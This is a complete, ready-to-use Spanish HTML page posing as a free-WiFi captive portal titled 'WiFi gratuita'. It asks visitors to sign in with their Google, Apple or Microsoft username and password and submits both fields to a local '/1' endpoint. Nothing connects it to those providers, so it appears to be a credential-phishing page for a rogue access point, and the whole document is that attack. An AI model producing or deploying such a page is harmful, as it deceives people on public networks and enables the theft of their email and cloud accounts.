<!DOCTYPE html><html lang="es"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Gratis</title>
<style>
*{box-sizing:border-box}
body{font-family:system-ui,sans-serif;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#2b5876,#4e4376);color:#333}
.card{width:100%;max-width:340px;margin:16px;background:#fff;border-radius:14px;padding:28px 24px;box-shadow:0 10px 30px rgba(0,0,0,.3);text-align:center}
.logo{width:56px;height:56px;border-radius:50%;background:#4e4376;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px}
h1{font-size:20px;margin:0 0 4px}
p{color:#777;font-size:13px;margin:0 0 20px}
input{width:100%;padding:13px;margin:7px 0;border:1px solid #ddd;border-radius:8px;font-size:15px}
button{width:100%;padding:13px;margin-top:12px;border:0;border-radius:8px;background:#4e4376;color:#fff;font-size:16px;font-weight:600}
.f{font-size:11px;color:#aaa;margin-top:16px}
</style></head><body>
<div class="card">
<div class="logo">&#128246;</div>
<h1>WiFi gratuita</h1>
<p>Inicia sesion para navegar gratis. Usa tu cuenta Google, Apple o Microsoft</p>
<form method="GET" action="/1">
<input name="u" placeholder="Usuario o email" required>
<input name="p" type="password" placeholder="Contrase&ntilde;a" required>
<button>Conectar</button>
</form>
<div class="f">Al conectarte aceptas los terminos de uso</div>
</div></body></html>
